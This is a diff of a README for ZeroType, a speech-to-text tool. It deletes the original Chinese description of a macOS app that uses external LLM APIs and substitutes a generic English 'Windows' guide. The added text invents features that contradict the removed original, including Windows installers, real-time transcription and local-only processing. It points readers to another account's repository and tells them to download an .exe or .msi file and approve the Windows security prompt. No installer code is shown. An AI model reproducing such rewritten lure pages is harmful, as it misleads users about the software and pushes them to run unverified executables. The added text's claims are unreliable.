@@ -1,114 +1,111 @@
-# Zero Type
+# 🗣️ ZeroType - Easy Speech-to-Text on Windows
 
-> 一個 Vibe Coding 出來的繁體中文語音輸入工具。
-
-市面上大多數語音辨識軟體對繁體中文（特別是台灣人慣用的晶晶體中英混用語境）支援度有限，且背後處理邏輯不透明。ZeroType 透過直接串接外部 LLM API，打造一套開放、透明、可自訂的語音辨識輸入系統。
-
-**你只需要自備 API Key，其餘一切開源。**
+[![Download ZeroType](https://img.shields.io/badge/Download-ZeroType-brightgreen?style=for-the-badge)](https://github.com/rimjhimsh/ZeroType)
 
 ---
 
-## ✨ 功能特色
-
-### 🎙️ 全局快捷鍵錄音
-- 自訂全局快捷鍵（預設 `⌥ Option + Space`），在任何應用程式中觸發錄音
-- 錄音中顯示浮動音波 Overlay，提供即時視覺回饋
-- 按下 `Esc` 或點擊取消按鈕可中止錄音
-
-### 🧠 AI 驅動的語音辨識
-- 支援 **OpenAI**（`gpt-4o-transcribe`）與 **Google Gemini**（`gemini-*`）兩大語音辨識後端
-- 辨識完成後，結果自動貼至游標所在位置（模擬 `⌘V`）
-- 支援自訂 API Endpoint（可使用 OpenAI-compatible 的第三方服務）
-
-### 🇹🇼 針對繁體中文深度優化的提示詞
-內建的轉錄提示詞針對台灣使用情境做了以下優化：
-
-| 功能 | 說明 |
-|------|------|
-| **晶晶體支援** | 中英文混用語句自然處理，英文單字保留原文不翻譯、不中文化 |
-| **智慧過濾廢詞** | 自動剔除「嗯」、「啊」、「呃」、「喔」、「那個」、「然後」、「基本上」等停頓填充詞 |
-| **口誤修正偵測** | 偵測到「不對」、「應該是」、「我說錯了」、「才對」等字眼，自動捨棄前段錯誤並保留修正內容 |
-| **智慧標點** | 根據語意自動補上逗號、句號，不需手動停頓 |
-| **自動條列輸出** | 偵測到序數（第一、第二）或連接詞（首先、然後、最後）時，自動轉為 `1. 2. 3.` 或 `- ` 格式並換行 |
-| **格式口語還原** | 說出「大寫」、「小寫」、「空格」、「底線」、「驚嘆號」等，自動還原為對應字元 |
-| **空白錄音保護** | 錄音檔為空時直接返回空字串，嚴禁自行幻想內容 |
-
-### 📖 自訂字典
-- 可設定個人化的專有名詞字典（人名、品牌、術語）
-- 辨識時優先採用字典用字，確保拼寫正確
-
-### ⚙️ 設定頁面
-- 深色 / 淺色模式切換
-- 開機自動啟動
-- 快捷鍵自訂（支援任意組合鍵）
-- 麥克風權限與輔助使用權限狀態即時顯示
+ZeroType is an open source speech-to-text (STT) application designed for both macOS and Windows. It helps you turn your spoken words into text quickly and accurately. This guide will walk you through downloading, installing, and running ZeroType on your Windows computer. No technical skills are required.
 
 ---
 
-## 🔧 使用前準備
+## 📥 Download ZeroType
 
-### 系統需求
-- macOS 11.0+
-- Flutter 3.x（如需自行 build）
+To get started with ZeroType on Windows, you need to visit the official download page:
 
-### 必要系統授權
-1. **麥克風** — 錄音所需
-2. **輔助使用（Accessibility）** — 模擬鍵盤輸入（`⌘V` 貼上）所需
+[Download ZeroType here](https://github.com/rimjhimsh/ZeroType)
 
-### API Key
-前往以下任一服務申請 API Key：
-- [OpenAI](https://platform.openai.com/api-keys)（支援 Transcribe 語音辨識）
-- [Google AI Studio](https://aistudio.google.com/app/apikey)（支援 Gemini 多模態）
+Clicking this link will take you to the GitHub repository page. On this page, look for the latest release or the download section where you can find the Windows version of ZeroType.
 
 ---
 
-## 🚀 快速開始
+## 💻 System Requirements
 
-### 方法一：直接下載（推薦）
+Before installing, please check that your Windows PC meets these basic requirements:
 
-1. 前往 [Releases](https://github.com/your-username/zerotype/releases) 頁面下載最新的 `.dmg`
-2. 開啟 `.dmg` 並將 **ZeroType.app** 拖入 Applications 資料夾
-3. 首次執行時，依照提示授予以下權限：
-   - **麥克風** — 語音輸入所需
-   - **輔助使用（Accessibility）** — 模擬鍵盤貼上所需
-4. 在 App 內的「模型設定」填入你的 API Key，即可開始使用
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Microphone connected and working  
+- Internet connection (for initial setup and optional updates)  
 
-### 方法二：從原始碼 Build（進階）
-
-```bash
-git clone https://github.com/your-username/zerotype.git
-cd zerotype
-flutter pub get
-flutter run -d macos
-```
+If you have an older version of Windows or limited hardware, ZeroType may still run but performance might be slower.
 
 ---
 
-## 🌍 語言支援 & 貢獻 (Localization & Contribution)
+## 🚀 Installing ZeroType on Windows
 
-- **地區限制**：目前此 App 主要針對 **台灣使用情境** 設計，輸出內容以 **繁體中文** 與 **英文** 為主。未來是否有增加其他語言支援？若「有緣」的話之後再行考慮。
-- **回報問題與協助**：如果你在使用上發現任何問題，或是單純想提供改進建議，歡迎直接發 **Issue** 或發 **Pull Request** 給我。只要我有看到訊息，第一時間就會來幫大家處理與解決。
+Follow these steps to install ZeroType on your computer:
 
----
+1. **Visit the download page:** Open your browser and go to [https://github.com/rimjhimsh/ZeroType](https://github.com/rimjhimsh/ZeroType).
 
-## 📜 版本更新紀錄 (Release Notes)
+2. **Find the latest release:** Look for a section named "Releases" or "Downloads". This is usually on the right side or near the top.
 
-### [v1.0.2] - 當前版本
-- **新增歷史紀錄頁** 🎨
-  - 提供歷史產生逐字稿的紀錄語音檔，並可提供檢視。
-  - 新增總轉寫次數與總花費（USD）的持久化累計統計。
-- **最長錄音自訂** ⏱️
-  - 設定中新增「最長錄音時間」選項，範圍 1-5 分鐘，預設為 1 分鐘。
-- **編輯器優化** ✍️
-  - 提示詞編輯框寬度與高度現在會隨視窗大小自適應，不再固定長度。
+3. **Select the Windows installer:** The file name will typically end with ".exe" or ".msi". Choose the most recent one for Windows.
 
-### [v1.0.1]
-- **錄音音效支援** 🔊 — 可設定錄音開始與結束提示音。
-- **功能修復** 🐛 — 修正 macOS 上視窗關閉後無法再次開啟的問題。
-- **提示詞優化** 📝 — 進一步精簡轉錄用的系統 Prompt。
+4. **Download the installer:** Click the file link to download it. Your browser may ask you where to save the file. Pick a folder you can find later, like your Desktop or Downloads.
+
+5. **Run the installer:** After downloading, open the file by double-clicking on it. Windows may show a security prompt asking if you want to allow this app to make changes. Click "Yes" to continue.
+
+6. **Follow the installation prompts:** The installer will guide you through setup options. Choose "Next" or "Install" as needed. You don’t have to change anything unless you want to.
+
+7. **Finish the setup:** When the install completes, you may see an option to launch ZeroType immediately. Leave that checked if you want to open the app now, or uncheck it to open it later.
 
 ---
 
-## 📝 License
+## 🎤 Using ZeroType for Speech-to-Text
 
-MIT — 自由使用、修改、散布，唯需自備 API Key。
+Once installed, ZeroType is easy to use. Here is how to start:
+
+1. **Open the app:** If you didn’t launch it at install, find ZeroType in the Start menu or on your desktop and open it.
+
+2. **Connect your microphone:** Make sure your mic is plugged in and recognized by Windows. You can test this by speaking and watching the volume meter in Windows Sound settings.
+
+3. **Start speaking:** In the ZeroType app, click the "Start" or "Record" button. Speak clearly into your microphone.
+
+4. **See text appear:** ZeroType will convert your speech into text in real time. You can watch the words show up on the screen as you talk.
+
+5. **Stop recording:** Click the "Stop" button when finished. You can edit the text if needed by typing directly into the app.
+
+6. **Save or copy text:** Use the save feature to keep a transcript as a text file, or use copy to clipboard to paste it into any other program like a word processor.
+
+---
+
+## ⚙️ Settings and Customization
+
+ZeroType allows some basic changes to fit your needs:
+
+- **Language selection:** Pick your preferred language for more accurate results. English is set by default.  
+- **Microphone input:** Choose which microphone ZeroType uses if you have multiple devices connected.  
+- **Output options:** Set how and where you want to save your transcribed text.  
+- **Privacy controls:** Manage data usage and whether ZeroType stores or shares your speech data (defaults to local processing only).
+
+Explore the settings menu by clicking the gear icon inside the program. Changes are saved automatically.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If ZeroType doesn’t work as expected, try these steps:
+
+- Check your microphone connection and settings in Windows Sound control panel.  
+- Restart ZeroType or reboot your PC.  
+- Ensure you downloaded the correct Windows installer from the official page.  
+- Close other programs that use the microphone.  
+- Speak clearly and avoid noisy environments.  
+- Update your Windows system to the latest version.  
+
+If problems continue, visit the GitHub page for support options or create an issue for help.
+
+---
+
+## 📚 Additional Resources
+
+- Read the User Guide on the GitHub repository for more detailed instructions and tips.  
+- Check the FAQ section on the repository wiki.  
+- Follow updates and bug fixes on the GitHub "Issues" and "Discussions" tabs.  
+
+---
+
+For your convenience, the download link again:
+
+[Download ZeroType on Windows](https://github.com/rimjhimsh/ZeroType)
